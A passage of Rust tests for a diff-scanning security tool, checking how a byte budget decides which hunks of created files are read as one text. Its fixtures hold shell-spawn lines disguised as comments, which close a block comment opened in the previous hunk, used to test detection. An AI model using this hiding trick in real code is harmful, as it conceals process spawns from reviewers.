        use std::fmt::Write as _;
        const LAST: &str = "let x = 1; /*";
        let first = spawn_after_comment(path);
        let mut text = format!("--- /dev/null\n+++ b/{path}\n");
        let mut at = 1;
        for &size in sizes {
            let mut lines = vec![first.to_owned()];
            let mut left = size - (first.len() + 1) - (LAST.len() + 1);
            while left > 0 {
                let line = left.min(401) - 1;
                lines.push(match line {
                    0 => String::new(),
                    1 => "x".to_owned(),
                    _ if wide => {
                        format!("//{}{}", "§".repeat((line - 2) / 2), "a".repeat(line % 2))
                    }
                    _ => format!("//{}", "a".repeat(line - 2)),
                });
                left -= line + 1;
            }
            lines.push(LAST.to_owned());
            let bytes: usize = lines.iter().map(|line| line.len() + 1).sum();
            assert_eq!(bytes, size);
            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
            for line in &lines {
                let _ = writeln!(text, "+{line}");
            }
            at += lines.len();
        }
        text
    }

    /// A line that closes a block comment and then spawns a process, in the language of `path`
    /// (JavaScript for `.js`, Rust otherwise): read alone it is a line comment.
    fn spawn_after_comment(path: &str) -> &'static str {
        if std::path::Path::new(path)
            .extension()
            .is_some_and(|ext| ext == "js")
        {
            "// */ execSync(\"sh\");"
        } else {
            "// */ std::process::Command::new(\"sh\");"
        }
    }

    /// `n` hunks of `each` bytes, and a last one of `last` bytes.
    fn sizes(n: usize, each: usize, last: usize) -> Vec<usize> {
        let mut sizes = vec![each; n];
        sizes.push(last);
        sizes
    }

    /// The edges of the bound, held exactly (each fails if the bound moves by one byte, if a
    /// `>` becomes `>=`, or if characters are counted instead of bytes): a creation of exactly
    /// 256 KiB is read together to its end and one of a byte more is not; a line of exactly
    /// 512 bytes is carried and one of 513 is not, in ASCII and in two-byte characters; and the
    /// labels of the hunks follow.
    #[test]
    fn the_bound_holds_at_its_exact_edges() {
        let together = |text: &str| -> usize {
            let files = parse(text).unwrap();
            let shares = CarriedShares::of(&files);
            let file = &files[0];
            assert_eq!(
                HunkLabels::new(file).read_together(),
                shares.read_together(0)
            );
            shares.read_together(0)
        };
        // 32 hunks: 31 of 8 KiB and a last one that makes 256 KiB exactly, or one byte more.
        for wide in [false, true] {
            let exact = sized_creation("src/x.rs", &sizes(31, 8192, 8192), wide);
            assert_eq!(together(&exact), 32, "exactly 256 KiB, wide {wide}");
            let over = sized_creation("src/x.rs", &sizes(31, 8192, 8193), wide);
            assert_eq!(together(&over), 31, "256 KiB and a byte, wide {wide}");
        }
        // The labels at the byte edge: the last hunk has the spawn only when it is carried.
        for (last, spawn) in [(8192, true), (8193, false)] {
            let text = sized_creation("src/x.rs", &sizes(31, 8192, last), false);
            let file = parse(&text).unwrap().remove(0);
            let expected = if spawn {
                vec![EvidenceSignal::ProcessSpawn]
            } else {
                Vec::new()
            };
            assert_eq!(HunkLabels::new(&file).of(31), expected, "last {last}");
            assert_eq!(
                HunkLabels::new(&file).of(30),
                [EvidenceSignal::ProcessSpawn]
            );
        }
        // A line of 512 bytes, then of 513, in hunk 3 of 6: in ASCII and in two-byte characters
        // (256 and 257 characters).
        for (line, wide, carried) in [
            (512, false, 6),
            (513, false, 3),
            (512, true, 6),
            (513, true, 3),
        ] {
            let long = if wide {
                format!("//{}{}", "§".repeat((line - 2) / 2), "a".repeat(line % 2))
            } else {
                format!("//{}", "a".repeat(line - 2))
            };
            assert_eq!(long.len(), line);
            let text = sized_creation("src/x.rs", &[600; 6], false);
            // Hunk 3's second line (a filler of 401 bytes, end included) becomes the long line.
            let (mut hunk, mut placed) = (0, false);
            let text: String = text
                .lines()
                .map(|l| {
                    hunk += usize::from(l.starts_with("+// */"));
                    if hunk == 4 && !placed && l.len() == 401 && l.starts_with("+//") {
                        placed = true;
                        format!("+{long}\n")
                    } else {
                        format!("{l}\n")
                    }
                })
                .collect();
            assert!(placed, "the long line is placed");
            assert_eq!(together(&text), carried, "line {line}, wide {wide}");
            let file = parse(&text).unwrap().remove(0);
            let spawn = !HunkLabels::new(&file).of(3).is_empty();
            assert_eq!(spawn, carried > 3, "line {line}, wide {wide}");
        }
    }

    /// The created files of a patch share one carried reading of 256 KiB, in patch order: what
    /// one file reads together is taken from what the files after it may, whatever their
    /// languages (the budget crosses into and out of each of Rust, JavaScript, Python, Go,
    /// shell and YAML, so a budget charged for some languages and not others fails).
    /// Held at its edges: the budget used up exactly at a file's end leaves the next file
    /// nothing, one byte inside the next file cuts that file at the hunk the byte is in, and a
    /// file with fewer than two hunks in its share, or not read as one text at all, takes
    /// nothing.
    #[test]
    fn the_created_files_of_a_patch_share_one_bound() {
        for exts in [
            ["rs", "rs", "rs"],
            ["rs", "js", "rs"],
            ["js", "rs", "js"],
            ["rs", "py", "go"],
            ["py", "go", "sh"],
            ["go", "sh", "yml"],
            ["sh", "yml", "js"],
            ["yml", "rs", "py"],
        ] {
            created_files_share_one_bound(exts);
        }
    }

    /// [`the_created_files_of_a_patch_share_one_bound`] with the files A, B and C in the
    /// languages of the extensions `exts`; the files between them that take nothing are in
    /// B's.
    fn created_files_share_one_bound(exts: [&str; 3]) {
        let [a, b, c] = [("a", exts[0]), ("b", exts[1]), ("c", exts[2])]
            .map(|(name, ext)| format!("src/{name}.{ext}"));
        let between_ext = exts[1];
        // A: 32 hunks, all of 8 KiB but the last; B and C: three hunks of 100 bytes.
        let shares_of = |a_last: usize, between: &str| -> Vec<usize> {
            let mut text = sized_creation(&a, &sizes(31, 8192, a_last), false);
            text.push_str(between);
            text.push_str(&sized_creation(&b, &[100; 3], false));
            text.push_str(&sized_creation(&c, &[100; 3], false));
            let files = parse(&text).unwrap();
            let shares = CarriedShares::of(&files);
            (0..files.len()).map(|i| shares.read_together(i)).collect()
        };
        let full = 8192;
        // A takes 256 KiB less 600: B and C read together to their ends.
        assert_eq!(shares_of(full - 600, ""), [32, 3, 3], "{exts:?}");
        // Less 599: C's last hunk is the one the byte is in; it has two hunks still.
        assert_eq!(shares_of(full - 599, ""), [32, 3, 2], "{exts:?}");
        // Less 300: B to its end, C nothing.
        assert_eq!(shares_of(full - 300, ""), [32, 3, 0], "{exts:?}");
        // Less 299: B cut in its last hunk, and C has the 99 bytes left, under one hunk.
        assert_eq!(shares_of(full - 299, ""), [32, 2, 0], "{exts:?}");
        // Less 200: B has two hunks; less 199: one, so it is not read as one text, and
        // takes nothing: C has the 199 bytes, one hunk, and nothing either.
        assert_eq!(shares_of(full - 200, ""), [32, 2, 0], "{exts:?}");
        assert_eq!(shares_of(full - 199, ""), [32, 0, 0], "{exts:?}");
        // A takes exactly 256 KiB: the others nothing. A byte more: A is cut at its last
        // hunk, and B and C share what A's last hunk would have taken.
        assert_eq!(shares_of(full, ""), [32, 0, 0], "{exts:?}");
        assert_eq!(shares_of(full + 1, ""), [31, 3, 3], "{exts:?}");
        // Files that are not read as one text take nothing: a file that exists, a creation in
        // one hunk, a creation whose first hunk has a line over 512 bytes, and a creation in
        // a language no rule reads.
        let modified = "--- a/src/m.rs\n+++ b/src/m.rs\n@@ -1,1 +1,2 @@\n x\n+y\n";
        let one_hunk = sized_creation(&format!("src/one.{between_ext}"), &[300_000], false);
        let long_first = format!(
            "--- /dev/null\n+++ b/src/long.{between_ext}\n@@ -0,0 +1,1 @@\n+//{}\n@@ -0,0 +2,1 @@\n+x\n",
            "a".repeat(600)
        );
        let no_rules =
            "--- /dev/null\n+++ b/notes.unknown-kind\n@@ -0,0 +1,1 @@\n+a\n@@ -0,0 +2,1 @@\n+b\n";
        let between = format!("{modified}{one_hunk}{long_first}{no_rules}");
        let shares = shares_of(full - 600, &between);
        assert_eq!(shares, [32, 0, 0, 0, 0, 3, 3], "{exts:?}");
        // A creation whose first hunk fits in what is left and whose second does not has one
        // hunk in its share: it is not read as one text and takes nothing, so B after it still
        // has the 300 bytes left.
        let one_fits = sized_creation(&format!("src/one_fits.{between_ext}"), &[100, 250], false);
        assert_eq!(shares_of(full - 300, &one_fits), [32, 0, 3, 0], "{exts:?}");
    }

    /// One request reads at most 256 KiB in the carried reading, whatever it asks: the rank of
    /// a patch of 24 creations, Rust and JavaScript in turn, each of about 64 KiB and under
    /// every limit of a file of its own, reads exactly the shares of the first four (counted
    /// on the thread, whatever readers it makes), and labels every hunk as its share says; one
    /// reader for each file, asked in reverse with its share, reads no more.
    #[test]
    fn one_request_reads_at_most_the_bound_in_all() {
        let mut text = String::new();
        for f in 0..24 {
            let ext = if f % 2 == 0 { "rs" } else { "js" };
            text.push_str(&sized_creation(
                &format!("src/f{f}.{ext}"),
                &[4096; 16],
                false,
            ));
        }
        let files = parse(&text).unwrap();
        let shares = CarriedShares::of(&files);
        let wanted: Vec<usize> = (0..24).map(|f| if f < 4 { 16 } else { 0 }).collect();
        let got: Vec<usize> = (0..24).map(|f| shares.read_together(f)).collect();
        assert_eq!(got, wanted);
        for file in &files {
            assert_eq!(
                HunkLabels::new(file).read_together(),
                16,
                "as its patch's only file"
            );
        }
        // The first hunk of a file comes into nothing open, and is not read in the carried
        // reading; the other 15 of each of the four files are, once.
        let once = CARRIED_BYTES - 4 * 4096;
        let before = carried_bytes_on_this_thread();
        let ranked = crate::rank(&files);
        assert_eq!(carried_bytes_on_this_thread() - before, once);
        for (f, file) in files.iter().enumerate() {
            let listed = ranked.iter().find(|r| r.path == file.path).unwrap();
            let carried = released_evidence(file, shares.share(f));
            for (h, hunk) in file.patch_twin.hunks.iter().enumerate() {
                // The reading of 0.8.4 finds the spawn as far as the file's share goes.
                let has = carried.iter().any(|e| e.hunk == hunk.id);
                assert_eq!(has, (1..wanted[f]).contains(&h), "file {f} hunk {h}");
                // Since the merge with the integrity signals the rank finds it in every later
                // hunk of every file: their reading of a creation as one text has no bound, and
                // a fragment is also read from inside a block comment. (Was the same
                // `(1..wanted[f])` for the rank.)
                let has = listed.evidence.iter().any(|e| e.hunk == hunk.id);
                assert_eq!(has, h > 0, "rank: file {f} hunk {h}");
            }
        }
        let before = carried_bytes_on_this_thread();
        let reversed: Vec<usize> = (0..16).rev().collect();
        for (f, file) in files.iter().enumerate() {
            let mut labels = HunkLabels::in_patch(file, &shares, f, &reversed);
            for &h in &reversed {
                let spawn = labels.of(h) == [EvidenceSignal::ProcessSpawn];
                assert_eq!(spawn, (1..wanted[f]).contains(&h), "file {f} hunk {h}");
            }
        }
        assert_eq!(carried_bytes_on_this_thread() - before, once);
        // Each hunk of each file alone, a reader each: at most one file's share each.
        for (f, file) in files.iter().enumerate() {
            for h in 0..16 {
                let before = carried_bytes_on_this_thread();
                let _ = HunkLabels::in_patch(file, &shares, f, &[]).of(h);
                let read = carried_bytes_on_this_thread() - before;
                assert!(
                    read <= 16 * 4096 && (f < 4 || read == 0),
                    "file {f} hunk {h}: {read}"
                );
            }
        }
    }

    /// The shares of the created files of a patch against a model of the rule, on generated
    /// patches: wrong shares by size, by position, by language and by kind of file, as far as
    /// the generator reaches. It reaches patches of up to 60 files (so up to 50 creations), the
    /// kinds of file in `KINDS` and the shebangs they write; a share that is wrong only past
    /// that (from the 51st creation, or for an extension or a shebang no kind writes) is not
    /// caught here.
    mod shares_model {
        // `std::fmt::Write` comes with `super::*` since the merge with the integrity signals.
        use super::*;

        /// How many patches the test writes. Each has 1 to 60 files.
        const PATCHES: usize = 240;

        /// The budget and the longest line, as the CHANGELOG states them.
        const BUDGET: usize = 256 * 1024;
        const LONGEST_LINE: usize = 512;

        /// A deterministic generator (xorshift), from a fixed seed.
        struct Rng(u64);

        impl Rng {
            fn below(&mut self, n: usize) -> usize {
                self.0 ^= self.0 << 13;
                self.0 ^= self.0 >> 7;
                self.0 ^= self.0 << 17;
                usize::try_from(self.0 % (n as u64)).unwrap()
            }
        }

        /// How a created file is written.
        #[derive(Clone, Copy)]
        struct Kind {
            /// Its path, `#` standing for the file's number in the patch.
            path: &'static str,
            /// Its first line, a shebang, when it has one.
            shebang: Option<&'static str>,
            /// The scanner reads it in a language: by its extension, by its name
            /// (`Dockerfile`, `Makefile`) or, with no extension, by its shebang. Said here from
            /// the documented table, not asked of the code.
            in_language: bool,
            /// A line comment; a line that leaves something open at the end of a hunk in the
            /// language (a block comment, a triple string, a string); and one that closes it at
            /// the start of the next hunk. So each later hunk read together comes into
            /// something open, and the carried reading reads it.
            style: [&'static str; 3],
        }

        const C_LIKE: [&str; 3] = ["//", "x = 1; /*", "*/ y = 2;"];
        const PYTHON: [&str; 3] = ["#", "x = \"\"\"", "\"\"\""];
        const SHELL: [&str; 3] = ["#", "x=\"", "\""];
        const YAML: [&str; 3] = ["#", "x: \"", "\""];
        const TEXT: [&str; 3] = ["", "text", "text"];

        const fn kind(
            path: &'static str,
            shebang: Option<&'static str>,
            in_language: bool,
            style: [&'static str; 3],
        ) -> Kind {
            Kind {
                path,
                shebang,
                in_language,
                style,
            }
        }

        /// Every language the scanner reads, by every route to it, and files in none.
        const KINDS: [Kind; 25] = [
            kind("src/f#.rs", None, true, C_LIKE),
            kind("vendor/f#/lib.rs", None, true, C_LIKE),
            kind("f#/build.rs", None, true, C_LIKE),
            kind("web/f#.js", None, true, C_LIKE),
            kind("web/f#.ts", None, true, C_LIKE),
            kind("web/f#.tsx", None, true, C_LIKE),
            kind("web/f#.mjs", None, true, C_LIKE),
            kind("go/f#.go", None, true, C_LIKE),
            kind("py/f#.py", None, true, PYTHON),
            kind("py/f#.pyi", None, true, PYTHON),
            kind("sh/f#.sh", None, true, SHELL),
            kind("sh/f#.bash", None, true, SHELL),
            kind("mk/f#.mk", None, true, SHELL),
            kind("f#/Dockerfile", None, true, SHELL),
            kind("f#/Dockerfile.dev", None, true, SHELL),
            kind("f#/Makefile", None, true, SHELL),
            kind(".github/workflows/f#.yml", None, true, YAML),
            kind("cfg/f#.yaml", None, true, YAML),
            kind("bin/f#", Some("#!/bin/sh"), true, SHELL),
            kind("bin/f#", Some("#!/usr/bin/env bash"), true, SHELL),
            kind("bin/f#", Some("#!/usr/bin/env python3"), true, PYTHON),
            kind("bin/f#", Some("#!/usr/bin/env node"), true, C_LIKE),
            kind("docs/f#.txt", None, false, TEXT),
            kind("bin/f#", Some("#!/usr/bin/env ruby"), false, TEXT),
            kind("f#/LICENSE", None, false, TEXT),
        ];

        /// The size of a created file.
        #[derive(Clone, Copy, PartialEq, Eq)]
        enum Size {
            /// Two or three hunks of one to three short lines: under 200 bytes.
            Tiny,
            /// Two to 8 hunks, each with up to 6 lines of up to 120 bytes besides the lines
            /// that close and open.
            Small,
            /// Two to 24 hunks, each with up to 13 lines of up to 300 bytes besides those.
            Medium,
            /// Hunks each with up to 17 lines of 300 to 500 bytes besides those, to about 230
            /// to 330 KiB in all: from most of the budget to past all of it.
            Huge,
            /// One hunk.
            OneHunk,
        }

        /// A file of a generated patch: its section, and what the model reads of it, which the
        /// generator knows from how it wrote it.
        struct Written {
            path: String,
            /// The kind it was written as (an index into [`KINDS`]), when the patch creates it.
            created: Option<usize>,
            /// The lines of the new side of each hunk, when the patch creates it.
            hunks: Vec<Vec<String>>,
            section: String,
        }

        impl Written {
            /// The patch creates it in a language, in more than one hunk.
            fn takes_part(&self) -> bool {
                self.created.is_some_and(|k| KINDS[k].in_language) && self.hunks.len() > 1
            }
        }

        /// A line of `bytes` bytes: `comment` then letters, or two-byte characters.
        fn line_of(rng: &mut Rng, comment: &str, bytes: usize) -> String {
            let rest = bytes.saturating_sub(comment.len());
            if rng.below(4) == 0 {
                format!("{comment}{}{}", "§".repeat(rest / 2), "a".repeat(rest % 2))
            } else {
                format!("{comment}{}", "a".repeat(rest))
            }
        }

        /// A file the patch creates, numbered `number`, of kind `at` and of size `size`. Up to
        /// a fifth of the larger ones has a line over 512 bytes in its first hunk, its second
        /// or a later one; up to an eighth has a line of exactly 512 bytes.
        fn creation(rng: &mut Rng, number: usize, at: usize, size: Size) -> Written {
            let kind = KINDS[at];
            let [comment, opener, closer] = kind.style;
            let path = kind.path.replace('#', &number.to_string());
            let (count, fillers, widths) = match size {
                Size::Tiny => (2 + rng.below(2), 0, (0, 1)),
                Size::Small => (2 + rng.below(7), 5, (0, 120)),
                Size::Medium => (2 + rng.below(23), 12, (0, 300)),
                Size::Huge => (usize::MAX, 16, (300, 500)),
                Size::OneHunk => (1, 5, (0, 120)),
            };
            let target = 230 * 1024 + rng.below(100 * 1024);
            let larger = matches!(size, Size::Small | Size::Medium | Size::Huge);
            let long = match rng.below(15) {
                0 if larger => Some(0),
                1 if larger => Some(1),
                2 if larger => Some(2 + rng.below(if size == Size::Huge { 40 } else { 6 })),
                _ => None,
            };
            let exact = (larger && rng.below(8) == 0).then(|| rng.below(8));
            let mut hunks: Vec<Vec<String>> = Vec::new();
            let mut total = 0;
            while hunks.len() < count && (size != Size::Huge || total <= target) {
                let h = hunks.len();
                let mut lines = Vec::new();
                match (h, kind.shebang) {
                    (0, Some(shebang)) => lines.push(shebang.to_owned()),
                    (0, None) => {}
                    _ => lines.push(closer.to_owned()),
                }
                for _ in 0..rng.below(fillers + 2) {
                    let bytes = widths.0 + rng.below(widths.1 - widths.0 + 1);
                    lines.push(line_of(rng, comment, bytes));
                }
                if long == Some(h) {
                    let bytes = LONGEST_LINE + 1 + rng.below(1000);
                    // Anywhere but before a shebang, which names the language on line 1 only.
                    let at = rng
                        .below(lines.len() + 1)
                        .max(usize::from(h == 0 && kind.shebang.is_some()));
                    lines.insert(at, line_of(rng, comment, bytes));
                }
                if exact == Some(h) {
                    lines.push(line_of(rng, comment, LONGEST_LINE));
                }
                if h > 0 && lines.len() == 1 && rng.below(2) == 0 {
                    // A hunk of one line, that closes what the hunk before left and opens again.
                    lines[0] = format!("{closer} {opener}");
                } else {
                    lines.push(opener.to_owned());
                }
                total += lines.iter().map(|line| line.len() + 1).sum::<usize>();
                hunks.push(lines);
            }
            let mode = if kind.shebang.is_some() {
                "100755"
            } else {
                "100644"
            };
            let mut section = format!(
                "diff --git a/{path} b/{path}\nnew file mode {mode}\n--- /dev/null\n+++ b/{path}\n"
            );
            let mut start = 1;
            for hunk in &hunks {
                let _ = writeln!(section, "@@ -0,0 +{start},{} @@", hunk.len());
                for line in hunk {
                    let _ = writeln!(section, "+{line}");
                }
                start += hunk.len();
            }
            Written {
                path,
                created: Some(at),
                hunks,
                section,
            }
        }

        /// A file the patch does not create, numbered `number`: one that exists (in one to
        /// three hunks), renamed with changes, deleted, or binary.
        fn other(rng: &mut Rng, number: usize) -> Written {
            let kind = KINDS[rng.below(KINDS.len())];
            let path = kind.path.replace('#', &number.to_string());
            let mut hunks = String::new();
            for k in 0..=rng.below(3) {
                let bytes = if rng.below(6) == 0 { 600 } else { 40 };
                let line = line_of(rng, kind.style[0], bytes);
                let _ = write!(
                    hunks,
                    "@@ -{},1 +{},2 @@\n+{line}\n x\n",
                    1 + 10 * k,
                    1 + 11 * k
                );
            }
            let (path, section) = match rng.below(4) {
                0 => (
                    path.clone(),
                    format!("diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n{hunks}"),
                ),
                1 => (
                    path.clone(),
                    format!(
                        "diff --git a/old/{path} b/{path}\nsimilarity index 90%\nrename from old/{path}\nrename to {path}\n--- a/old/{path}\n+++ b/{path}\n{hunks}"
                    ),
                ),
                2 => (
                    path.clone(),
                    format!(
                        "diff --git a/{path} b/{path}\ndeleted file mode 100644\n--- a/{path}\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-a\n-b\n"
                    ),
                ),
                _ => {
                    let path = format!("img/f{number}.png");
                    let section = format!(
                        "diff --git a/{path} b/{path}\nindex 1111111..2222222 100644\nBinary files a/{path} and b/{path} differ\n"
                    );
                    (path, section)
                }
            };
            Written {
                path,
                created: None,
                hunks: Vec::new(),
                section,
            }
        }

        /// A patch of 1 to 60 files in random order. In a third of the patches no file is
        /// huge, so the budget is not used up; in a third one huge file is among the first
        /// three; in a third it is in the middle.
        fn generated_patch(rng: &mut Rng) -> (String, Vec<Written>) {
            let n = 1 + rng.below(60);
            let scenario = rng.below(3);
            let huge_at = match scenario {
                0 => usize::MAX,
                1 => rng.below(n.min(3)),
                _ => n / 3 + rng.below(n / 3 + 1),
            };
            let in_language: Vec<usize> =
                (0..KINDS.len()).filter(|&k| KINDS[k].in_language).collect();
            let in_none: Vec<usize> = (0..KINDS.len())
                .filter(|&k| !KINDS[k].in_language)
                .collect();
            let mut written = Vec::new();
            for number in 0..n {
                let some_language = in_language[rng.below(in_language.len())];
                let file = if number == huge_at {
                    creation(rng, number, some_language, Size::Huge)
                } else {
                    match rng.below(20) {
                        0..=10 => {
                            let size = match rng.below(10) {
                                0..=3 => Size::Tiny,
                                8..=9 if scenario != 0 => Size::Medium,
                                _ => Size::Small,
                            };
                            creation(rng, number, some_language, size)
                        }
                        11..=12 => {
                            let none = in_none[rng.below(in_none.len())];
                            creation(rng, number, none, Size::Small)
                        }
                        13 => creation(rng, number, some_language, Size::OneHunk),
                        _ => other(rng, number),
                    }
                };
                written.push(file);
            }
            let text = written.iter().map(|w| w.section.as_str()).collect();
            (text, written)
        }

        /// What the model gives a file.
        #[derive(Debug, Clone, Copy, Default)]
        struct Modelled {
            /// How many hunks, from the first, are read together.
            together: usize,
            /// Their bytes, which it takes from the budget.
            bytes: usize,
            /// The bytes of those after the first: what the carried reading reads of them
            /// (the first comes into nothing open).
            after_first: usize,
            /// The hunk it stopped at, and whether for a long line (or for the budget).
            stop: Option<(usize, bool)>,
        }

        /// The rule as the CHANGELOG states it, written plainly from it: the files go in
        /// patch order and share one budget of 256 KiB of the new side, each line counted with
        /// its end. A file the patch creates in more than one hunk, in a language, has its
        /// hunks from the first up to the one that would take it past what the files before it
        /// left, or that has a line longer than 512 bytes. With fewer than two hunks so, it is
        /// not read as one text and takes nothing; else it takes their bytes from the budget.
        /// Every other file takes nothing.
        fn model(written: &[Written]) -> Vec<Modelled> {
            let mut left = BUDGET;
            let mut shares = Vec::new();
            for file in written {
                let mut share = Modelled::default();
                if file.takes_part() {
                    let (mut together, mut bytes, mut first) = (0, 0, 0);
                    for (h, hunk) in file.hunks.iter().enumerate() {
                        let long = hunk.iter().any(|line| line.len() > LONGEST_LINE);
                        let size: usize = hunk.iter().map(|line| line.len() + 1).sum();
                        if long || bytes + size > left {
                            share.stop = Some((h, long));
                            break;
                        }
                        if h == 0 {
                            first = size;
                        }
                        together += 1;
                        bytes += size;
                    }
                    if together > 1 {
                        left -= bytes;
                        share.together = together;
                        share.bytes = bytes;
                        share.after_first = bytes - first;
                    }
                }
                shares.push(share);
            }
            shares
        }

        /// What the generated patches held, so the test fails if they stop holding enough of
        /// each case.
        #[derive(Debug, Default)]
        struct Seen {
            /// Shares under 200 bytes.
            tiny_shares: usize,
            /// Shares under 200 bytes before the first file the budget stops.
            tiny_before_cut: usize,
            /// Files the budget stops.
            budget_stops: usize,
            /// Files stopped by a long line in their first hunk, their second, a later one.
            long_stops: [usize; 3],
            /// Patches whose budget is used up by one of their first three files, a later one,
            /// none.
            out_early: usize,
            out_later: usize,
            out_never: usize,
            /// Patches of more than 25 created files whose budget runs out at a file before the
            /// 25th, with a file after the 25th that takes part.
            many_out_early: usize,
            /// Created files of more than 256 KiB.
            past_budget: usize,
            /// For each kind, the shares of at least 16 KiB.
            large_shares: [usize; KINDS.len()],
        }

        impl Seen {
            fn count(&mut self, written: &[Written], modelled: &[Modelled]) {
                let first_out = modelled
                    .iter()
                    .position(|m| m.stop.is_some_and(|(_, long)| !long));
                for (f, (file, m)) in written.iter().zip(modelled).enumerate() {
                    let total: usize = file.hunks.iter().flatten().map(|l| l.len() + 1).sum();
                    self.past_budget += usize::from(total > BUDGET);
                    if m.together > 1 && m.bytes < 200 {
                        self.tiny_shares += 1;
                    }
                    if m.bytes >= 16 * 1024 {
                        self.large_shares[file.created.unwrap()] += 1;
                    }
                    match m.stop {
                        Some((_, false)) => self.budget_stops += 1,
                        Some((h, true)) => self.long_stops[h.min(2)] += 1,
                        None => {}
                    }
                    if first_out.is_some_and(|out| f < out) && m.together > 1 && m.bytes < 200 {
                        self.tiny_before_cut += 1;
                    }
                }
                let created = written.iter().filter(|w| w.created.is_some()).count();
                let late_part = written.iter().skip(25).any(Written::takes_part);
                match first_out {
                    None => self.out_never += 1,
                    Some(out) if out < 3 => self.out_early += 1,
                    Some(_) => self.out_later += 1,
                }
                if created > 25 && first_out.is_some_and(|out| out < 24) && late_part {
                    self.many_out_early += 1;
                }
            }

            fn assert_enough(&self) {
                let s = self;
                assert!(s.tiny_shares >= 200 && s.tiny_before_cut >= 100, "{s:?}");
                assert!(
                    s.budget_stops >= 100 && s.long_stops.iter().all(|&n| n >= 10),
                    "{s:?}"
                );
                assert!(
                    s.out_early >= 30 && s.out_later >= 30 && s.out_never >= 30,
                    "{s:?}"
                );
                assert!(s.many_out_early >= 20 && s.past_budget >= 20, "{s:?}");
                for (k, kind) in KINDS.iter().enumerate() {
                    assert!(
                        !kind.in_language || s.large_shares[k] > 0,
                        "no large share of {}: {s:?}",
                        kind.path
                    );
                }
            }
        }

        /// For each of 240 generated patches (each of 1 to 60 files in random order: created
        /// files of every size, from one line or under 200 bytes to past the whole budget, in
        /// one hunk or several; lines over 512 bytes in a first, second or later hunk; every
        /// language the scanner reads, by extension, by name and by shebang alone, and files in
        /// none; files that exist, renamed, deleted and binary; more than 25 created files in
        /// some; the budget used up early, in the middle and never), the shares are those of
        /// [`model`], which is written from the stated rule and not from the code; and the
        /// rank's carried reading reads at most 256 KiB, exactly the bytes of the shares' hunks
        /// after the first.
        #[test]
        fn the_shares_are_those_of_the_stated_rule_on_generated_patches() {
            let mut rng = Rng(0x5A4E_D0F5_C0DE_B0D9);
            let mut seen = Seen::default();
            for p in 0..PATCHES {
                let (text, written) = generated_patch(&mut rng);
                let files = parse(&text).unwrap();
                let paths: Vec<&str> = files.iter().map(|f| f.path.as_str()).collect();
                let wanted: Vec<&str> = written.iter().map(|w| w.path.as_str()).collect();
                assert_eq!(paths, wanted, "patch {p}");
                let modelled = model(&written);
                let shares = CarriedShares::of(&files);
                let wrong: Vec<String> = modelled
                    .iter()
                    .enumerate()
                    .filter(|&(f, m)| shares.read_together(f) != m.together)
                    .map(|(f, m)| {
                        format!(
                            "file {f} {} ({} hunks): {} hunks, the model {} ({} bytes)",
                            written[f].path,
                            written[f].hunks.len(),
                            shares.read_together(f),
                            m.together,
                            m.bytes
                        )
                    })
                    .collect();
                assert!(wrong.is_empty(), "patch {p}: {wrong:#?}");
                let before = carried_bytes_on_this_thread();
                let _ranked = crate::rank(&files);
                let read = carried_bytes_on_this_thread() - before;
                let by_the_model: usize = modelled.iter().map(|m| m.after_first).sum();
                assert!(read <= BUDGET, "patch {p}: {read}");
                assert_eq!(read, by_the_model, "patch {p}: the rank's carried reading");
                seen.count(&written, &modelled);
            }
            seen.assert_enough();
        }
    }

    /// At the bound, the list of a file the patch creates in several hunks holds every item
    /// 0.8.3 would list, though the reading carried from hunk to hunk finds more: 300
    /// generated creations of 40 to 100 lines, cut into hunks at random, with comments left
    /// open at the cuts.
    #[test]
    fn the_bounded_list_of_a_creation_in_hunks_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const TOKENS: [&str; 4] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\");",
            "let _ = reqwest::blocking::get(u);",
            "let x = 1;",
        ];
        let mut seed = 0x0DDB_1A5E_5BAD_5EED_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut carried) = (0, 0);
        for _ in 0..300 {
            let lines = 40 + next(61);
            let mut text = "--- /dev/null\n+++ b/src/x.rs\n".to_owned();
            let mut at = 0;
            while at < lines {
                let take = (1 + next(6)).min(lines - at);
                let _ = writeln!(text, "@@ -0,0 +{},{take} @@", at + 1);
                for line in 0..take {
                    let token = TOKENS[next(TOKENS.len())];
                    let _ = match (line + 1 == take, next(8)) {
                        // the last line of a hunk often leaves a comment open
                        (true, 0..=3) => writeln!(text, "+{token} /*"),
                        // and a line often closes one behind a line comment
                        (_, 4..=5) => writeln!(text, "+// */ {token}"),
                        _ => writeln!(text, "+{token}"),
                    };
                }
                at += take;
            }
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, _) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            let (_, marks) = file_evidence_marked(&file, Share::Own);
            carried += marks.iter().filter(|released| !**released).count();
        }
        assert!(
            cut > 100 && carried > 300,
            "{cut} lists cut, {carried} further items"
        );
    }

    /// For each hunk of `file`: every item it has when it is read alone is an item of the file,
    /// and its labels are the file's whether the hunks are asked in order, one at a time or
    /// backwards. Returns how many hunks have more items in the file than alone.
    fn hunks_with_more_than_alone(file: &ReviewFile, text: &str) -> usize {
        let hunks = &file.patch_twin.hunks;
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RELEASED_RULES
            .iter()
            .filter(|r| kind.admits(r.scope))
            .collect();
        // What the reading of 0.8.4 gives the file, which `HunkLabels` is held to below; and
        // the file's evidence, which since the merge with the integrity signals holds that
        // and what their readings add. (Was `file_evidence(file)` for both.)
        let evidence = released_evidence(file, Share::Own);
        let whole = file_evidence(file);
        let of_whole = |hunk: &PatchHunk| -> Vec<_> {
            whole
                .iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| (e.side, e.signal, e.line))
                .collect()
        };
        let of_file = |hunk: &PatchHunk| -> Vec<_> {
            evidence
                .iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| (e.side, e.signal, e.line))
                .collect()
        };
        let mut more = 0;
        let mut in_order = HunkLabels::new(file);
        for (index, hunk) in hunks.iter().enumerate() {
            let of_file = of_file(hunk);
            let alone = hunk_matches(hunk, kind.language, &rules);
            let of_whole = of_whole(hunk);
            for item in &alone {
                assert!(of_file.contains(item), "{item:?} of hunk {index}:\n{text}");
